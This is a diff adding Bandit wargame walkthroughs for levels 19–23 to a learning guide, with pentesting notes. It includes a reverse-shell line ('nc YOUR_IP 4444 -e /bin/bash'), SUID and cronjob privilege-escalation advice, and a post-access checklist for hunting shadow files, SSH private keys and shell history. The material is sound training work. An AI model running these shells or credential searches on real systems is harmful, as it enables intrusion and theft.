@@ -483,3 +483,185 @@ interactive shell — `.bashrc` never fires.
 and exits, bypassing shell config files like `.bashrc`.
 
 ---
+
+
+## Level 19 → 20
+
+**Goal:** Use a SUID binary to read the password of bandit20.
+
+**Concept — SUID (Set User ID):**
+Normally a program runs with the permissions of whoever executes it.
+With the SUID bit active, the program runs with the permissions of the **file owner**, regardless of who calls it.
+
+You can spot it with `ls -la` — look for an `s` instead of `x` in the owner execute position:
+
+```
+-rwsr-xr-x  1 bandit20 bandit19 ...  bandit20-do
+ ^^^
+ 's' here = SUID active, runs as bandit20
+```
+
+**Solution:**
+```bash
+ls -la
+./bandit20-do cat /etc/bandit_pass/bandit20
+```
+
+The binary executes any command you pass as bandit20. So you pass `cat` on bandit20's password file directly.
+
+**Why it matters in pentesting:**
+Finding a SUID binary that runs arbitrary commands is a classic privilege escalation vector.
+First recon step on any system:
+```bash
+find / -perm -4000 2>/dev/null
+```
+Then check each result on **GTFOBins** (gtfobins.github.io) to see if it's exploitable.
+
+---
+
+## Level 20 → 21
+
+**Goal:** Use a SUID binary that connects to a port and returns the next password if it receives the current one.
+
+**Concepts:**
+- `nc` (netcat) — creates network connections, can act as a server or client
+- Background processes (`&`) — runs a command without blocking the terminal
+
+**Solution:**
+```bash
+echo "PASSWORD_BANDIT20" | nc -l -p 4444 &
+./suconnect 4444
+```
+
+Step by step:
+1. `nc -l -p 4444` — listens on port 4444
+2. `echo "PASSWORD" |` — pipes the password so nc sends it when someone connects
+3. `&` — runs nc in the background so you can keep using the terminal
+4. `./suconnect 4444` — connects to port 4444, receives the password, validates it, sends back bandit21's password
+
+**Why it matters in pentesting:**
+`nc` is called the "Swiss Army knife of networking". Setting up a listener (`nc -l`) is exactly what you do when catching a **reverse shell**:
+```bash
+# On your machine (attacker)
+nc -l -p 4444
+
+# On victim machine (via exploit)
+nc YOUR_IP 4444 -e /bin/bash
+```
+Once connected, you have an interactive shell on the victim — same concept as this level.
+
+---
+
+## Level 21 → 22
+
+**Goal:** Find a cronjob running as bandit22 that writes its password to a readable temp file.
+
+**Concept — Cron:**
+Cron is Linux's task scheduler. It runs commands automatically on a schedule.
+System cronjobs are stored in `/etc/cron.d/` — always check this directory on any machine you access.
+
+Crontab format:
+```
+* * * * *  command
+│ │ │ │ └─ day of week (0-7)
+│ │ │ └─── month (1-12)
+│ │ └───── day of month (1-31)
+│ └─────── hour (0-23)
+└───────── minute (0-59)
+```
+
+**Solution:**
+```bash
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/<filename shown in the script>
+```
+
+The script runs every minute as bandit22 and copies its password to `/tmp/` with permissions 644 (world-readable). You just read it directly.
+
+**Why it matters in pentesting:**
+If a cronjob runs as root and executes a script you can modify, you inject your code and it runs as root. Always check:
+- Who owns the script being executed
+- What permissions that script has
+- Whether you can write to it
+
+---
+
+## Level 22 → 23
+
+**Goal:** A cronjob runs as bandit23 and writes its password to a temp file with a hashed name. Calculate the hash to find the file.
+
+**Concept — Hash functions as predictable filenames:**
+The script generates the filename using `md5sum` on a predictable string. If you know the input, you can calculate the output without running the script directly.
+
+**The script:**
+```bash
+myname=$(whoami)   # returns "bandit23" when run by cron
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+**Solution:**
+```bash
+# Replicate what the script does, but with bandit23 hardcoded
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/<hash result>
+```
+
+You can't run the script as bandit23, but you can reproduce its logic manually since all inputs are known.
+
+**Why it matters in pentesting:**
+Predictable filenames, tokens, or identifiers are a common vulnerability. If you can reverse-engineer how a system generates a value, you can access resources without authorization.
+
+---
+
+## Common Linux directories to check during pentesting
+
+When you get access to a Linux machine, these are the first places to look:
+
+### Scheduled tasks
+```
+/etc/cron.d/          cronjobs dropped by packages or admins
+/etc/cron.daily/      scripts that run daily
+/etc/cron.hourly/     scripts that run every hour
+/etc/crontab          global system crontab
+/var/spool/cron/      per-user crontabs
+```
+**What to look for:** scripts owned by privileged users that you can modify, or temp files they write that you can read.
+
+### Credentials and config
+```
+/etc/passwd           list of all users
+/etc/shadow           hashed passwords (usually root-only)
+/etc/sudoers          who can run what as sudo
+~/.ssh/               SSH keys (id_rsa = private key, jackpot if readable)
+~/.bash_history       command history, may contain passwords typed in plaintext
+/var/www/html/        web app files, often contain DB credentials
+```
+
+### SUID binaries
+```bash
+find / -perm -4000 2>/dev/null
+```
+Then check each result on gtfobins.github.io
+
+### Writable directories (useful for dropping files/scripts)
+```
+/tmp/
+/var/tmp/
+/dev/shm/
+```
+
+### Running processes and open ports
+```bash
+ps aux              # all running processes
+ss -tulnp           # open ports and listening services
+```
+
+### Interesting files
+```bash
+find / -name "*.conf" 2>/dev/null    # config files
+find / -name "*.log" 2>/dev/null     # log files
+find / -name "id_rsa" 2>/dev/null    # SSH private keys
+find / -writable -type f 2>/dev/null # files you can write to
+```
